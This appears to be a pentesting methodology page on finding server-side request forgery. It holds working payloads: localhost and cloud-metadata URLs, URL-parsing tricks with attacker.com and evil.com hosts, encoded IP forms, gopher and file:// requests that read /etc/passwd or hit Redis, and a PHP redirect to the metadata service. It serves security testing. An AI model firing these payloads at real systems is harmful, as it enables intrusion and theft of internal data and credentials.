---
tags:
  - critical
  - server-side
---

# Finding SSRF

## Where to Look

### High-Value Targets

- [ ] URL parameters (`url=`, `link=`, `src=`, `dest=`, `redirect=`, `uri=`, `path=`, `file=`)
- [ ] Webhook configurations
- [ ] File import from URL
- [ ] PDF generators (HTML to PDF - wkhtmltopdf, Puppeteer, TCPDF)
- [ ] Image/avatar from URL
- [ ] API integrations setup
- [ ] URL preview/unfurl features (Slack-style)
- [ ] Proxy/redirect endpoints
- [ ] Document converters
- [ ] Screenshot services
- [ ] Link unfurling (favicons, OpenGraph)

### Often Overlooked

- [ ] XML external entity (XXE → SSRF)
- [ ] SVG file uploads with external references (`xlink:href`)
- [ ] RSS/Atom feed parsers
- [ ] OAuth callback URLs
- [ ] OpenID configuration URLs
- [ ] SAML metadata endpoints
- [ ] GraphQL queries with URL fields
- [ ] Git URLs (project import)
- [ ] Project import features

### Headers to Test

```http
X-Forwarded-For: http://127.0.0.1
X-Forwarded-Host: http://127.0.0.1
X-Original-URL: http://127.0.0.1
X-Rewrite-URL: http://127.0.0.1
Referer: http://127.0.0.1
```

---

## Methodology

### 1. Identify URL Input Points

Look for any parameter accepting URLs:

```
?url=https://example.com
?src=https://example.com/image.png
?redirect=https://...
?callback=https://...
?webhookUrl=https://...
?importUrl=https://...
```

### 2. Test with External Server

First, confirm the server makes outbound requests:

```
?url=https://YOUR-BURP-COLLABORATOR.net
```

Check for:
- HTTP/DNS requests to your server
- User-Agent and other headers
- Request timing

**Detection Tools:**
- Interactsh / Interactsh — OOB callback detection
- Param Miner — Header/parameter discovery
- DNS: webhook.site, requestbin.net, canarytokens.org

### 3. Test Internal Targets

```bash
# Localhost variations
?url=http://127.0.0.1
?url=http://localhost
?url=http://127.1
?url=http://0.0.0.0
?url=http://[::1]

# Cloud metadata
?url=http://169.254.169.254/latest/meta-data/

# Internal networks
?url=http://192.168.1.1
?url=http://10.0.0.1
?url=http://172.16.0.1
```

### 4. Identify Response Type

| Type | Behavior | Impact |
|------|----------|--------|
| **Full response** | See the entire response | High - can read internal data |
| **Partial response** | See status code or headers only | Medium - can port scan |
| **Blind** | No response visible | Low-Medium - need out-of-band |
| **Time-based** | Response time differs | Low - can infer open ports |
| **Error-based** | Different error messages | Low-Medium - can detect services |

---

## Bypass Techniques (Quick Reference)

### URL Parsing Confusion

```bash
# @ trick
http://evil.com#@trusted.com
http://trusted.com@evil.com

# Domain confusion
http://127.0.0.1.attacker.com
http://attacker.com%252f@trusted.com

# Backslash
http://attacker.com\.trusted.com
```

### IP Address Formats

```bash
# Decimal
http://2130706433  # 127.0.0.1

# Hex
http://0x7f000001  # 127.0.0.1

# Octal
http://0177.0.0.1  # 127.0.0.1

# Mixed
http://127.1
http://127.0.1
```

### DNS Rebinding

1. Set up DNS that alternates between your IP and 127.0.0.1
2. First request resolves to allowed IP
3. Second request (from server) resolves to internal IP

Services: `1u.ms`, `rbndr.us`, custom DNS

### Protocol Smuggling

```bash
# Gopher (powerful!)
gopher://127.0.0.1:6379/_INFO

# File
file:///etc/passwd

# Dict
dict://127.0.0.1:11211/stats
```

### Redirect-Based

Set up a redirect on your server:

```php
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
```

Then:

```
?url=http://your-server.com/redirect.php
```

---

## Detection Tips

### Caido

1. Send all URL parameters to Collaborator
2. Use automated scanner's SSRF checks
3. Check for DNS vs HTTP interactions

### Manual Testing

```bash
# Check if filtering is client-side or server-side
# Client-side: JavaScript validation, can bypass with Caido

# Check what protocols are allowed
http:// https:// file:// gopher:// dict://

# Check for partial matches
127.0.0.1 blocked? Try 127.0.0.2, 127.1, 2130706433
```

---

Found a request going out? Move to [Exploitation](exploit.md).

Need bypass techniques? Check [Bypasses](bypasses.md).
